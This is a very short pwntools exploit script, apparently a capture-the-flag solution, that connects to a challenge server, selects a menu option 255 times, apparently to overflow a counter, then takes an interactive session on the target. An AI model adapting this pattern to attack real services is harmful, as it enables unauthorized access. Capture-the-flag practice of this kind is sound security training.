from pwn import *

r = remote("pwn.chal.ctf.gdgalgiers.com","1402")

for i in range(255 ):
    r.sendlineafter('Choice:','1')
r.sendlineafter('Choice:','3')
r.interactive()